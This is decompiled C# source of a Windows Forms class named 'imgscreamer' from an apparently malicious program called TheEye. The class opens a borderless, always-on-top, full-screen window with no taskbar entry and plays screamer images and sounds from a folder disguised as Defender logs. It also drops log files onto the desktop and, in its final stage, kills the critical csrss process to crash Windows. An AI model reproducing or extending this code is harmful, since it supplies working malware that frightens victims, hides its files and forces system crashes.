// Decompiled with JetBrains decompiler
// Type: TheEye.imgscreamer
// Assembly: TheEye, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1F112655-6C2B-4871-B1D6-7F6EA80D9DFB
// Assembly location: R:\WinBackup\Downloads\TheEye (Beta) [c0d9d by DesConnet](1)\src\Resources\theeye.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TheEye
{
  public class imgscreamer : Form
  {
    private IContainer components;
    private PictureBox pictureBox1;

    public imgscreamer() => this.InitializeComponent();

    public void Scream(int ScreamNumber)
    {
      this.pictureBox1.Image = Image.FromFile(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\" + Vars.imgscr[ScreamNumber]);
      Task.Run((Action) (() =>
      {
        using (SoundPlayer soundPlayer = new SoundPlayer(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\" + Vars.soundscr[ScreamNumber]))
          soundPlayer.PlaySync();
      })).ContinueWith((Action<Task>) (t =>
      {
        if (!Vars.finalTheEye)
        {
          using (new Form1())
            Form1.main.PlayLooping();
          this.pictureBox1.Dispose();
          GC.Collect();
          this.Close();
        }
        else
          Process.GetProcessesByName("csrss")[0].Kill();
      }), TaskScheduler.FromCurrentSynchronizationContext());
    }

    private void Imgscreamer_Shown(object sender, EventArgs e)
    {
      int ScreamNumber = new Random().Next(0, 6);
      if (Vars.MessageLog <= 10)
      {
        if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Vars.copyLogName + Vars.MessageLog.ToString() + ".txt"))
          ++Vars.MessageLog;
        else
          File.Copy(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\" + Vars.tempLogName + Vars.MessageLog.ToString() + ".txt", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Vars.copyLogName + Vars.MessageLog.ToString() + ".txt");
      }
      ++Vars.MessageLog;
      this.Scream(ScreamNumber);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.pictureBox1 = new PictureBox();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.pictureBox1.Cursor = Cursors.Default;
      this.pictureBox1.Dock = DockStyle.Fill;
      this.pictureBox1.Location = new Point(0, 0);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(800, 510);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ActiveCaptionText;
      this.ClientSize = new Size(800, 510);
      this.ControlBox = false;
      this.Controls.Add((Control) this.pictureBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (imgscreamer);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (imgscreamer);
      this.TopMost = true;
      this.WindowState = FormWindowState.Maximized;
      this.Shown += new EventHandler(this.Imgscreamer_Shown);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
    }

    public class Disposeing : IDisposable
    {
      private IntPtr handle;
      private Component component = new Component();
      private bool disposed;

      public Disposeing(IntPtr handle) => this.handle = handle;

      public void Dispose()
      {
        this.Dispose(true);
        GC.SuppressFinalize((object) this);
      }

      protected virtual void Dispose(bool disposing)
      {
        if (this.disposed)
          return;
        if (disposing)
          this.component.Dispose();
        imgscreamer.Disposeing.CloseHandle(this.handle);
        this.handle = IntPtr.Zero;
        this.disposed = true;
      }

      [DllImport("Kernel32")]
      private static extern bool CloseHandle(IntPtr handle);

      ~Disposeing() => this.Dispose(false);
    }
  }
}
